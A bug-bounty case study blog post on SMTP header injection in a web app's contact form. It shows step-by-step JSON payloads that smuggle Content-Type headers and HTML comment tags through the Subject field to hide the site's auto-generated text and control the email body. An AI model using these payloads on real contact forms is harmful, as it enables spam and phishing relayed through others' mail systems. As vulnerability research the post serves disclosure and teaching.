---
title: "Case Study: SMTP Header Injection - Part 2"
date: 2019-08-19
tags: [bug bounty, web application]
categories: [hacking]
author_profile: false
---


This post continues my [previous](https://michaelehmke.github.io/hacking/smtp-header-injection-case-study-1/) Case Study article on SMTP Header Injection.

The focus this time is to use a SMTP Header Injection payload to remove the auto-generated message that is inserted before the start of the user-provided message in emails sent through the “Contact Us” page. The message can be seen below as the first line in the email's body:

<img src="{{ site.url }}{{ site.baseurl }}/images/smtp_cs2/initial_ex_email.png" alt="example of auto-generated message in email" class="left-align shadow" style="width:calc(1010px * .66667)">

The point of this proof-of-concept was to further demonstrate how a dedicated attacker might abuse a vulnerability like this to further legitimize the vector as a relay for spam. Removing the automatic message would avoid questions or suspicions being raised by recipients due to the message being included in every exchange.

I can't go through them all here but many attempts to get rid of that auto-generated line were made, using a variety of different techniques. The ideas ranged from using CSS selectors to make the existing body invisible, using C-style escape sequences to "backspace" the entire line or insert enough newlines until the message couldn't be seen anymore, submitting a malformed header to cause Outlook to attach the entire body as a whole to the email itself, HTML injection into the First Name field to comment out the latter half of the message, and dozens of attempts with other headers and injection attempts into other fields besides the Subject; all this while abiding by the 30 character limit imposed by server-side validation code for the Subject field.

For reference, the JSON to submit an email to the API endpoint `https://haxxme.com/api/contact` is the following:

```json
{
    "firstName": "michael",
    "lastName": "ehmke",
    "email": "michaelehmke@example.com",
    "phone": "1112223333",
    "subject": "this is my subject",
    "message": "this is my message"
}
```

Eventually I started messing with the `Content-Type` header field. This field tells the email client what kind of data to expect and how to interpret it. If we view the header of the email that gets sent out, it shows that its Content-Type is `Multipart/Mixed`. Essentially, this type allows boundaries to be defined throughout the body of the email, and within each boundary a different Content-Type could be potentially specified. Content outside of a boundary is ignored and not shown by the email client. A more thorough explanation of how that header field works and how it may be utilized in a SMTP Header Injection attack is given in an [introductory article](https://michaelehmke.github.io/hacking/smtp-header-injection/) of mine.

A basic example of how an email that has it's `Content-type` set to `mutlipart/mixed` is formatted:

```
From: User1@website.com
To: User2@website.com
Subject: Check this out
Content-type: multipart/mixed; boundary=myboundary

this is not displayed
--myboundary

by default, this is plaintext

--myboundary
Content-type: text/plain

this has been specified to be plaintext

--myboundary--
this is also not displayed
```
	
In order to utilize this header field to make the auto-generated message disappear, the idea would be to inject a new Content-Type header of `Multipart/Mixed` into the Subject field, define a boundary name, instantiate the opening boundary, and set the Content-Type for the boundary to `text/html` so that everything following it (including the pre-existing Content-Type header and boundary definitions) could be under my control. Then I would need to include the actual message I want to send in the body, close the boundary and announce the end of the email so that everything after my closing boundary (including the pre-existing headers, as well as the auto-generated message) would be ignored. One problem though - the 30 character limit that this all needs to fit within. At a minimum, the following would need to be injected:

```sh
\nContent-Type:multipart/mixed;boundary=A\n\r\n--A\nContent-Type:text/html\n\n<html><body><My_Message></body></html>\n--A--
```
Components of the payload above:
1. Inject and define the Content-Type before the original is defined (this is important because the original Content-Type field defines boundaries with randomized names, so I can't try to guess and use those myself)
2. Define my own boundary name of `A`
3. Instantiate opening boundary with `--A`
4. Define Content-Type of the section to be `text/html`
5. Open an `<html>` and `<body>` tag
6. Include the message for the body of the email
7. Close with `</body>` and `</html>` tags
8. End email message with `--A--`

That all happens to be slightly longer than 30 characters. I thought that I might be able to fit the most necessary 30 characters in the Subject header, and with that, have taken over enough control of the body that I can concatenate the rest of the payload in the message field of the email in a way that makes sense to the parser. 

In an attempt to do this, I would, at an absolutely bare minimum, need to inject `\nContent-Type:multipart/mixed;` (coincidentally exactly 30 chars) and hopefully be able to utilize the message field for the rest.

This theory quickly got burned however when I took a closer look at a plaintext dump of the email. The dump can be evoked by injecting into the body from the header field with a double line feed `\n\n`. When looking at the now-plaintext headers and body, it is made clear that any data inserted into the message field would be located too far down in the body since it occurs much later after the pre-existing Content-Type header and boundaries have been set up.

<img src="{{ site.url }}{{ site.baseurl }}/images/smtp_cs2/highlighted_plaintext_body.png" alt="metadata in plaintext dumped into email message" class="left-align shadow"  style="width:calc(1067px * .66667)">

The areas highlighted green above are where the original Content-Type field and boundary are instantiated. I would need to define and open my own boundary and close it before the original is even reached, otherwise they will appear in the email message as plaintext metadata even if they won’t necessarily be parsed as control fields. The blue highlighted text serves as a point of reference as the visible body of the email message is normally contained within these limits. The text highlighted yellow is where any user-provided data would be placed for use with the idea of using that as the latter part of a concatenation, which is clearly not situated in a helpful location.

Since the original email already had the Content-Type set to `multipart/mixed`, I tried to instead define and set my own boundary since I had space for those characters, but that didn't work, probably due to syntactical reasons rather than strictly the ordering of headers. I started to notice that in the dump of the email, the body maintains the same formatting for C-style escape sequences that the header fields use and it just lists the metadata information as well as the original HTML markup in plaintext, instead of rendering the data as HTML. 

This led me to start thinking that if I overrode the Content-Type to `text/html` instead, then all of that metadata could be converted to HTML instead of being parsed as and resuming control as header fields. This would essentially get rid of the boundaries that were present and then maybe it could all be wrapped up in HTML and CSS to make it all disappear.

There were enough characters to inject the Content-Type:text/html payload but when sent and parsed by the email client, nothing in the message changed:

```json
{
    "firstName": "TheCEO",
    "lastName": "YourBoss",
    "email": "the_ceo@haxxme.com",
    "phone": "1112223333",
    "subject": "Z\nContent-type:text/html;\n",
    "message": "this is my message"
}
```

Resulting email:

<img src="{{ site.url }}{{ site.baseurl }}/images/smtp_cs2/z_attempt.png" alt="pic of email with no changes visible" class="left-align shadow" style="width:calc(1080px * .66667)">

I needed to break out of the scope of the headers and transfer control to the body, pushing the original Content-Type header and boundaries into the body as well, to allow my new header to enforce itself on the body’s contents:

```json
{
    "firstName": "TheCEO",
    "lastName": "YourBoss",
    "email": "the_ceo@haxxme.com",
    "phone": "1112223333",
    "subject": "Z\nContent-type:text/html;\n\n",
    "message": "this is my message"
}
```

Resulting email:

<img src="{{ site.url }}{{ site.baseurl }}/images/smtp_cs2/z_progress.png" alt="metadata pushed to email body, but everything is rendered as html" class="left-align shadow" style="width:calc(1075px * .66667)">

It can be seen above that afterwards, the metadata still printed to the body, but now the formatting of the text broke down and the HTML tags are no longer being displayed. Viewing the source of the email further validates that everything has now been encapsulated by my new Content-Type header to be interpreted as HTML.

```html
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
MIME-Version: 1.0
Content-Type: multipart/mixed; 
	boundary=&quot;----=_Part_2337_1756916918.1561753192452&quot;
X-Mailer: sendmsg

------=_Part_2337_1756916918.1561753192452
Content-Type: text/html; charset=utf-8
Content-Transfer-Encoding: 7bit

<html>
	<head>
		<style>
		body {
			font-family: Calibri,sans-serif;
		}
		</style>
	</head>
	<body>
		Message from the Contact Us page from TheCEO. The information requested is:
		<br><br>
		this is my message
	</body>
</html>
------=_Part_2337_1756916918.1561753192452--
```

Now the issue is to get rid of all the old metadata information that’s getting displayed in the email. All the metadata exists prior to the opening `<html>` tag so I can't select it with CSS to make it all disappear (by either changing the text color to white or modifying the attributes to “hidden”). I tried to append `<html>` at the end of my header injection so that it would be inserted before all the metadata but there were only 4 characters available in the Subject field where I could inject.

I noticed that the `<meta>` tag and its properties were not showing in the actual email body as plaintext. So I thought that if I opened a `<meta` tag, but never closed it with the right angle bracket, it might absorb everything after it as its own property data. There were only 4 characters left so I was only able to try with `<met` but I just went with it.

```json
{
    "firstName": "TheCEO",
    "lastName": "YourBoss",
    "email": "the_ceo@haxxme.com",
    "phone": "1112223333",
    "subject": "\nContent-type:text/html;\n\n<met",
    "message": "this is my message"
}
```

Resulting email:

<img src="{{ site.url }}{{ site.baseurl }}/images/smtp_cs2/met_tag_1st.png" alt="open met tag made all the metadata in email body to disappear" class="left-align shadow" style="width:calc(1072px * .66667)">

The name of the tag didn't end up mattering, and it did absorb everything after it until it hit a closing angle bracket `>` which happened to be the opening `<html>` tag. Now, the only text left showing is all the data after that closing bracket (rendered as HTML), including the greeting message that we're trying to get rid of. It would appear that we are almost back to square one, still with the auto-generated line visible in the message. What’s different now however is that we have some level of control in the *body* both before and after that line, where before, we only had control in the headers and in the body after the auto-generated message. 

Paying close attention to the colors of the syntax highlighting in the source, effectively shows how the metadata was swallowed up by the open `<met` tag:

```html
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"><met
MIME-Version: 1.0
Content-Type: multipart/mixed; 
	boundary=&quot;----=_Part_2337_1756916918.1561753192452&quot;
X-Mailer: sendmsg

------=_Part_2337_1756916918.1561753192452
Content-Type: text/html; charset=utf-8
Content-Transfer-Encoding: 7bit<html>
	<head>
		<style>
		body {
			font-family: Calibri,sans-serif;
		}
		</style>
	</head>
	<body>
		Message from the Contact Us page from TheCEO. The information requested is:
		<br><br>
		this is my message
	</body>
</html>
------=_Part_2337_1756916918.1561753192452--
```

Since I had now effectively turned everything into `text/html` through the Content-Type header, where before it was all `multipart/mixed` data types, I thought that it may not matter if everything is encapsulated within `<html>` and `<body>` tags in order for the client to be able to parse the data as HTML. I replaced the `<met` opening tag with `<p>` since there were enough characters left in the Subject field to squeeze that in for injection. Before, I had wanted to inject `<html>` in that location to encapsulate all of the message data but there was no room. I put the closing `</p>` in the actual message section of the email, thinking that if all the data from the beginning of the old, now unused, metadata headers to the start of my custom message were wrapped with the `<p>` tags, then I could select that whole block with CSS and make it all disappear. I tested this first by changing the color of `<p>` elements to red with a CSS block:

```json
{
    "firstName": "TheCEO",
    "lastName": "YourBoss",
    "email": "the_ceo@haxxme.com",
    "phone": "1112223333",
    "subject": "\nContent-type:text/html;\n\n<p>",
    "message": "</p><style>p {color:red;}</style><p>turn everything red</p>"
}
```

Not really what I was hoping for:

<img src="{{ site.url }}{{ site.baseurl }}/images/smtp_cs2/ironic_red.png" alt="everything in body red except the auto-generated message" class="left-align shadow" style="width:calc(1079px * .66667)">

Everything turned red except for the specific message that I've been trying to select this whole time, meaning I still won't be able to select it using this method. But this did prove that the `<p>` element did not need to be inside of `<html>` and `<body>` elements to be rendered correctly, and that the CSS styles within the pre-existing `<body>` tags would break out of scope and affect the `<p>` elements even outside of the `<html>` block. 

Viewing the source doesn’t immediately show why the injected `<p>` element did not totally encapsulate everything up to the closing `</p>` in the message, but it’s probable that this is due to hitting the opening `<html>` element and thus throwing the `<p>` out of scope, preventing it from continuing any further:

```html
1.  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"><p>
2.  MIME-Version: 1.0
3.  Content-Type: multipart/mixed; 
4.      boundary=&quot;----=_Part_2337_1756916918.435776435&quot;
5.  X-Mailer: sendmsg
6.
7.  ------=_Part_2337_1756916918.435776435
8.  Content-Type: text/html; charset=utf-8
9.  Content-Transfer-Encoding: 7bit
10. <html>
11. 	<head>
12. 		<style>body {font-family: Calibri,sans-serif;}</style>
13. 	</head>
14. 	<body>	
15.         Message from the Contact Us page from TheCEO. The information requested is:
16. 		<br><br>
17. 	    </p><style>p {color:red;}</style><p>turn everything red</p>
18. 	</body>
19. </html>
20. ------=_Part_2337_1756916918.435776435--
```

The intended span of encapsulation was from the `<p>` tag on **line 1** to the first closing `</p>` tag on **line 17**. Instead, it appears that only the data from the `<p>` tag on **line 1** to the `<html>` tag on **line 10** were encapsulated within the element's scope. That's why all of that text, between those two points, is colored red in the email. After that, the auto-generated message is rendered as usual, and then the text after the auto-generated message was wrapped in it’s own `<p>` tags, which is why that turned red.

One of the methods I had tried a while back before this was to insert HTML comment block tags on either side of the auto-generated message. Of course, this had to be done with the opening comment tag starting from the Subject field, since I had no other way to insert it before the message:

```json
{
    "firstName": "TheCEO",
    "lastName": "YourBoss",
    "email": "the_ceo@haxxme.com",
    "phone": "1112223333",
    "subject": "test subject\n\n<!--",
    "message": "--> this is my message"
}
```

This never worked because the only way to get the opening comment block tag in the body was to break out of the header with “\n\n”, which effectively breaks the Content-Type header that made anything HTML in the first place. So I was able to get both comment block tags in the body, but they were being parsed as plain-text and had no effect:

```plaintext
<!--
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
MIME-Version: 1.0
Content-Type: multipart/mixed; 
    boundary=&quot;----=_Part_2337_1756916918.234932477398&quot;
X-Mailer: sendmsg

------=_Part_2337_1756916918.234932477398
Content-Type: text/html; charset=utf-8
Content-Transfer-Encoding: 7bit
<html>
    <head>
        <style>
        body {
            font-family: Calibri,sans-serif;
        }
        </style>
    </head>
    <body>
        Message from the Contact Us page from TheCEO. The information requested is:
        <br><br>
        --> this is my message
    </body>
</html>
------=_Part_2337_1756916918.234932477398--
```

This time however, I’m able to insert data in the body to be parsed as HTML and by using the `<p>` elements in the previous attempt, I was able to prove that data does not need to be within `<html>` and `<body>` elements to be interpreted as HTML. So instead of injecting a `<p>` element, this time I tried injecting a HTML opening comment block tag `<!--`, for which I had exactly enough space left in the Subject field. It was inserted right after the `Content-Type:text/html` header field:

```json
{
    "firstName": "TheCEO",
    "lastName": "YourBoss",
    "email": "the_ceo@haxxme.com",
    "phone": "1112223333",
    "subject": "\nContent-type:text/html;\n\n<!--",
    "message": "--></p><style>p {color:red;}</style><p>finally, everything else is gone</p><!--"
}
```

Finally:

<img src="{{ site.url }}{{ site.baseurl }}/images/smtp_cs2/finally.png" alt="finally got rid of the auto-generated message" class="left-align shadow" style="width:calc(1084px * .66667)">

Viewing the source shows how everything is commented out by the injected comment block characters:

```html
<!--
MIME-Version: 1.0
Content-Type: multipart/mixed; 
	boundary=&quot;----=_Part_2337_1756916918.30493762935&quot;
X-Mailer: sendmsg

------=_Part_2337_1756916918.30493762935
Content-Type: text/html; charset=utf-8
Content-Transfer-Encoding: 7bit
<html>
	<head>
		<style>
		body {
			font-family: Calibri,sans-serif;
		}
		</style>
	</head>
	<body>
		Message from the Contact Us page from TheCEO. The information requested is:
		<br><br>
		--><meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"></p><style>p {color:red;}</style><p>finally, everything else is gone</p><!--
	</body>
</html>
------=_Part_2337_1756916918.30493762935--
```

This showed how to fine-tune the payload for a SMTP Header Injection found in this web application, to completely take control of and modify the message in the email sent through the app's "Contact Us" page. This proof-of-concept, as well as that in the previous Case Study, helped to show the implications of the vulnerability, rather than just simply showing that some arbitrary data could be injected with or without an actual effect.

